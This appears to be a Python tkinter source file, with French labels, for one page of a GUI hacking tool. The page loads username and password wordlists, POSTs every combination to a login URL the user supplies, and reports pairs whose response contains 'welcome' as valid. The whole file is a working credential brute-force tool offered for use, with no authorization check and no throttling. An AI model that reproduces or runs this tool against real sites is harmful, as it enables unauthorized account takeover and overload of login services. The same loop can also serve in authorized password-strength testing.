import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import requests
import threading

class bruteforcePage(tk.Frame):
    def __init__(self, parent, controller, global_url, show_button):
        super().__init__(parent)
        self.controller = controller
        self.global_url = global_url
        self.show_button = show_button

        # Titre de la page
        self.title_label = tk.Label(self, text="Brute Force Login Attack", font=("Arial", 16))
        self.title_label.pack(pady=20)

        # Champs pour l'URL
        self.url_label = tk.Label(self, text="URL de Login (ex: http://example.com/login):")
        self.url_label.pack(pady=5)
        self.url_entry = tk.Entry(self, width=40)
        self.url_entry.pack(pady=5)
        self.url_entry.insert(0, self.global_url)

        # Fichiers des logins
        self.username_label = tk.Label(self, text="Choisir un fichier des Logins:")
        self.username_label.pack(pady=5)

        # Menu déroulant pour choisir entre fichiers internes ou importer
        self.username_combobox = ttk.Combobox(self, state="readonly", width=40)
        self.username_combobox.pack(pady=5)
        self.username_combobox['values'] = [
            'username.txt',
            'dictionnaire username court.txt',
            'Importer depuis mon PC'
        ]
        self.username_combobox.set('username.txt')  # Valeur par défaut

        # Bouton pour confirmer le choix des logins
        self.username_select_button = tk.Button(self, text="Confirmer le choix des Logins", command=self.handle_username_selection)
        self.username_select_button.pack(pady=5)

        # Fichiers des mots de passe
        self.password_label = tk.Label(self, text="Choisir un fichier des Mots de Passe:")
        self.password_label.pack(pady=5)

        # Menu déroulant pour choisir entre fichiers internes ou importer
        self.password_combobox = ttk.Combobox(self, state="readonly", width=40)
        self.password_combobox.pack(pady=5)
        self.password_combobox['values'] = [
            'mdp.txt',
            'dictionnaire mdp court.txt',
            'Importer depuis mon PC'
        ]
        self.password_combobox.set('mdp.txt')  # Valeur par défaut

        # Bouton pour confirmer le choix des mots de passe
        self.password_select_button = tk.Button(self, text="Confirmer le choix des Mots de Passe", command=self.handle_password_selection)
        self.password_select_button.pack(pady=5)

        # Bouton pour démarrer l'attaque
        if self.show_button:
            self.start_button = tk.Button(self, text="Lancer l'attaque", command=self.start_attack)
            self.start_button.pack(pady=10)
        else:
            self.start_button = None  # Initialisation par défaut

        # Bouton "Stop" initialement désactivé
        if self.show_button:
            self.stop_button = tk.Button(self, text="Arrêter l'attaque", command=self.stop_attack, state=tk.DISABLED)
            self.stop_button.pack(pady=10)
        else:
            self.stop_button = None  # Initialisation par défaut

        # Label pour afficher le statut
        self.status_label = tk.Label(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)

        # Champ texte pour afficher les tentatives et résultats en temps réel
        self.test_output = tk.Text(self, height=15, width=60, wrap=tk.WORD, state=tk.DISABLED)
        self.test_output.pack(pady=10)

        # Tableau des résultats finaux
        self.results_label = tk.Label(self, text="Résultats finaux :", font=("Arial", 14))
        self.results_label.pack(pady=10)
        self.results_text = tk.Text(self, height=10, width=60, wrap=tk.WORD, state=tk.DISABLED)
        self.results_text.pack(pady=10)

        # Variables pour stocker les chemins des fichiers
        self.login_file_path = None
        self.password_file_path = None

        # Variables pour gérer l'état de l'attaque
        self.is_attack_running = False
        self.stop_requested = False

    def handle_username_selection(self):
        """Gérer la sélection du fichier des logins."""
        selection = self.username_combobox.get()
        default_folder = os.path.join(os.getcwd(), 'Dictionnaire')

        if selection == 'username.txt':
            internal_file = os.path.join(default_folder, 'username.txt')
        elif selection == 'dictionnaire username court.txt':
            internal_file = os.path.join(default_folder, 'dictionnaire username court.txt')
        elif selection == 'Importer depuis mon PC':
            file_path = filedialog.askopenfilename(
                title="Importer un fichier des Logins depuis mon PC",
                filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")]
            )
            if file_path:
                self.login_file_path = file_path
                messagebox.showinfo("Fichier sélectionné", f"Fichier importé depuis le PC : {file_path}")
                return
            else:
                self.login_file_path = None
                messagebox.showwarning("Aucun fichier sélectionné", "Aucun fichier de logins n'a été sélectionné.")
                return
        else:
            internal_file = None

        if internal_file and os.path.exists(internal_file):
            self.login_file_path = internal_file
            messagebox.showinfo("Fichier sélectionné", f"Fichier interne sélectionné : {internal_file}")
        else:
            messagebox.showerror("Erreur", f"Le fichier '{selection}' est introuvable dans le dossier 'Dictionnaire'.")

    def handle_password_selection(self):
        """Gérer la sélection du fichier des mots de passe."""
        selection = self.password_combobox.get()
        default_folder = os.path.join(os.getcwd(), 'Dictionnaire')

        if selection == 'mdp.txt':
            internal_file = os.path.join(default_folder, 'mdp.txt')
        elif selection == 'dictionnaire mdp court.txt':
            internal_file = os.path.join(default_folder, 'dictionnaire mdp court.txt')
        elif selection == 'Importer depuis mon PC':
            file_path = filedialog.askopenfilename(
                title="Importer un fichier des Mots de Passe depuis mon PC",
                filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")]
            )
            if file_path:
                self.password_file_path = file_path
                messagebox.showinfo("Fichier sélectionné", f"Fichier importé depuis le PC : {file_path}")
                return
            else:
                self.password_file_path = None
                messagebox.showwarning("Aucun fichier sélectionné", "Aucun fichier de mots de passe n'a été sélectionné.")
                return
        else:
            internal_file = None

        if internal_file and os.path.exists(internal_file):
            self.password_file_path = internal_file
            messagebox.showinfo("Fichier sélectionné", f"Fichier interne sélectionné : {internal_file}")
        else:
            messagebox.showerror("Erreur", f"Le fichier '{selection}' est introuvable dans le dossier 'Dictionnaire'.")

    def start_attack(self):
        """Démarrer l'attaque brute force."""
        url = self.url_entry.get()

        if not url or not self.login_file_path or not self.password_file_path:
            messagebox.showerror("Erreur", "Veuillez remplir l'URL et sélectionner les fichiers de logins et mots de passe.")
            return

        # Charger les logins et mots de passe à partir des fichiers
        try:
            with open(self.login_file_path, 'r') as f:
                logins = f.readlines()
            with open(self.password_file_path, 'r') as f:
                passwords = f.readlines()
        except FileNotFoundError:
            messagebox.showerror("Erreur", "Impossible de lire les fichiers sélectionnés.")
            return

        if self.start_button:
            self.start_button.config(state=tk.DISABLED)
        if self.stop_button:
            self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="L'attaque est en cours...")

        # Liste pour stocker les combinaisons valides
        valid_combinations = []

        self.is_attack_running = True
        self.stop_requested = False

        self.attack_thread = threading.Thread(target=self.run_attack, args=(url, logins, passwords, valid_combinations))
        self.attack_thread.start()

    def run_attack(self, url, logins, passwords, valid_combinations):
        """Effectuer l'attaque brute force dans un thread séparé."""
        results = []  # Liste des résultats (login, password, statut)

        for login in logins:
            if self.stop_requested:
                break
            for password in passwords:
                login = login.strip()
                password = password.strip()

                self.update_test_output(f"Tentative : {login} / {password}...\n")

                if self.try_login(url, login, password):
                    valid_combinations.append(f"{login} / {password}")
                    results.append((login, password, "Success"))
                    self.update_test_output(f"Réussi : {login} / {password}\n")
                else:
                    results.append((login, password, "Failed"))

        self.is_attack_running = False
        if self.start_button:
            self.start_button.config(state=tk.NORMAL)
        if self.stop_button:
            self.stop_button.config(state=tk.DISABLED)

        self.display_results(results)

    def update_test_output(self, message):
        """Mettre à jour la zone de texte avec les tentatives."""
        self.test_output.config(state=tk.NORMAL)
        self.test_output.insert(tk.END, message)
        self.test_output.see(tk.END)
        self.test_output.config(state=tk.DISABLED)

    def display_results(self, results):
        """Afficher les résultats finaux dans la zone dédiée."""
        self.results_text.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)  # Effacer le contenu précédent
        self.results_text.insert(tk.END, "Login / Mot de passe / Statut\n")
        self.results_text.insert(tk.END, "-" * 50 + "\n")

        for login, password, status in results:
            self.results_text.insert(tk.END, f"{login} / {password} / {status}\n")

        self.results_text.config(state=tk.DISABLED)

    def try_login(self, url, login, password):
        """Essayer une combinaison login et mot de passe."""
        data = {'username': login, 'password': password}
        try:
            response = requests.post(url, data=data)
            if "welcome" in response.text.lower():  # Condition de succès
                return True
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Erreur", f"Erreur de connexion : {e}")
        return False

    def stop_attack(self):
        """Arrêter l'attaque brute force."""
        self.stop_requested = True
        self.status_label.config(text="L'attaque a été arrêtée.")
        messagebox.showinfo("Arrêt", "L'attaque a été arrêtée.")
        if self.start_button:
            self.start_button.config(state=tk.NORMAL)
        if self.stop_button:
            self.stop_button.config(state=tk.DISABLED)
